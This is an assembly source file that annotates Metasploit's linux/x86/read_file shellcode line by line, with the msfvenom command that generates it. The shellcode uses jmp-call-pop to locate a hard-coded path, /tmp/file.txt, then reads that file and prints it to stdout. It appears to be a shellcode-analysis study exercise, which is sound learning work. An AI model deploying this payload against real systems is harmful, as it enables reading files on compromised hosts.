; read_file.nasm
;  - Analyzed shellcode from metasploit
;
; > msfvenom -a x86 --platform linux -p linux/x86/read_file PATH=/tmp/file.txt -f c

global _start

section .text
_start:

	jmp short section_2	; jmp call pop

section_1:

	; int open(const char *pathname, int flags)
	; eax = 0x5 (open)
	; ebx => /tmp/file.txt
	; ecx = 0x0

	mov eax,0x5
        pop ebx
        xor ecx,ecx
        int 0x80


	; size_t read(int fd, void *buf, size_t count)
	; eax = 0x3 (read)
	; ebx = handle from open
	; ecx = esp
	; edx = 0x1000

        mov ebx,eax
        mov eax,0x3
        mov edi,esp
        mov ecx,edi
        mov edx,0x1000
        int 0x80


	; ssize_t write(int fd, const void *buf, size_t count)
	; eax = 0x4 (write)
	; ebx = 0x1 (stdout)
        ; ecx = esp
        ; edx = 0x1000
        ; esp => |--data-from-file--|

        mov edx,eax
        mov eax,0x4
        mov ebx,0x1
        int 0x80


	; void exit(int status)
	; eax = 0x1 (exit)
	; ebx = 0x0

        mov eax,0x1
        mov ebx,0x0
        int 0x80

section_2:
        call section_1

section_3:
        das				; /
        jz 0xad				; tm
        jo 0x71				; p/
        imul bp,[ebp+0x2e],word 0x7874	; file.tx
        jz 0x4b				; t\0
